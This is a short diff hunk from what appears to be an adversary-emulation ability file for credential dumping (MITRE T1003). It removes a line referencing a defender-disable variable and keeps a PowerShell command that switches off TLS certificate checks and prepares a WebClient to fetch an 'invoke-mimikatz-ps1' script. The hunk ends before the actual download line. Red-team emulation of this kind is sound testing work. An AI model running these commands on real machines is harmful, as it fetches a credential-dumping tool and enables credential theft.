@@ -10,7 +10,6 @@
     attack_id: T1003
     name: Credential Dumping
   command: |
-    echo ${host.defender.disable}
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
     $web = (New-Object System.Net.WebClient)
     $web.Headers.add("file","invoke-mimikatz-ps1")
